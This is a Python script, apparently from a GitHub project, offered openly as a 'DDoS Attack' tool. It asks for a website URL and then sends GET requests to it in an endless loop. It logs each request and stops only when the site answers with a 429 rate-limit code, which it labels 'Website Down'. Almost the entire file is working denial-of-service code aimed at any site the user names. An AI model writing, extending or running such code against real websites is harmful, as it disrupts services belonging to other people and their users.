'''
MIT License
Copyright (c) 2022 Ahad 
If you want to use this code for any purpose, kindly give credits before using. 
You can modify or edit it but you are not allowed to remove the author name 
from the code.
The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
'''

# Importing required modules 
import httpx
from colorama import Fore, Style

# Making color variables so we can use it later.
yellow = Fore.YELLOW # Returns yellow color.
blue = Fore.BLUE # Returns blue color.
red = Fore.RED # Returns red color.
resetStyle = Style.RESET_ALL # Resets color/style
bright = Style.BRIGHT # Returns text brighter than normal.
# Defining our title [DDoS Attack] with color variables we made.
title = f"[{yellow}{bright}DDoS Attack{resetStyle}]"
# Defining counter.
count = 0

# Making a DDoS Tool class
class DDoS_Tool():
    # Making a function named Ahad to load credits, don't remove this function.
    def Ahad():
        print(f'''{red}{bright}
╔╦╗╔╦╗┌─┐╔═╗  ╔═╗┌┬┐┌┬┐┌─┐┌─┐┬┌─  ╔╦╗┌─┐┌─┐┬  
 ║║ ║║│ │╚═╗  ╠═╣ │  │ ├─┤│  ├┴┐   ║ │ ││ ││  
═╩╝═╩╝└─┘╚═╝  ╩ ╩ ┴  ┴ ┴ ┴└─┘┴ ┴   ╩ └─┘└─┘┴─┘
{resetStyle}''')
        
        print(f'''{yellow}
Author: Ahad#3257                           
Website: https://itscruel.cf
Github: https://github.com/CruelDev69/DDoS-Attacker
{resetStyle}''')
     
    # Making DDoS function to send requests.
    def DDoS():
     global count # Declaring count as a global variable.
     client = httpx.Client() # Constructing Httpx module's client.
     url = str(input(f"{title}{blue} Enter your website URL: {resetStyle}")) # Taking website URL as user input.
     while True: # Making a while loop which will loop until value returns to False
        try: # Using try/except so our program runs even if it catches a error.
            statusCode = client.get(url) # Sending request to URL provided via input.
            count += 1 # Updating counter
            # Logging logs to console.
            print(f"{title}{blue} Information: \nTarget: {url}\nRequest no: {count}\nWebsite Status: {statusCode.status_code}{resetStyle}")
            with open("logs.txt", "a") as f: # Logging logs in logs.txt file
                f.write(f"[DDos Attack] Information: \nTarget: {url}\nRequest no: {count}\nWebsite Status: {statusCode.status_code}\n")
        except:
            continue
        if statusCode.status_code == 429: # Checking if status code returns 429
            print((f'''{yellow}
|-----------------------------------------------------------------------|
|                ╦ ╦┌─┐┌┐ ┌─┐┬┌┬┐┌─┐  ╔╦╗┌─┐┬ ┬┌┐┌                      |
|                ║║║├┤ ├┴┐└─┐│ │ ├┤    ║║│ │││││││                      |
|                ╚╩╝└─┘└─┘└─┘┴ ┴ └─┘  ═╩╝└─┘└┴┘┘└┘                      |
|-----------------|-----------------------------------------------------|
| Target          | {url}                                               |
| Status Code     | {statusCode.status_code}                            |
| Requests title   | {count}                                             |
|-----------------|-----------------------------------------------------|
{resetStyle}'''))
            with open("logs.txt", "a") as f:
                f.write(f'''
|-----------------------------------------------------------------------|
|                ╦ ╦┌─┐┌┐ ┌─┐┬┌┬┐┌─┐  ╔╦╗┌─┐┬ ┬┌┐┌                      |
|                ║║║├┤ ├┴┐└─┐│ │ ├┤    ║║│ │││││││                      |
|                ╚╩╝└─┘└─┘└─┘┴ ┴ └─┘  ═╩╝└─┘└┴┘┘└┘                      |
|-----------------|-----------------------------------------------------|
| Target          | {url}                                               |
| Status Code     | {statusCode.status_code}                            |
| Requests title   | {count}                                             |
|-----------------|-----------------------------------------------------|
''')
            return False # If status code returns 429 it will return False and loop will break.


if __name__ == "__main__":
    DDoS_Tool.Ahad() # Calling Function named Ahad
    DDoS_Tool.DDoS() # Calling DDoS Function.
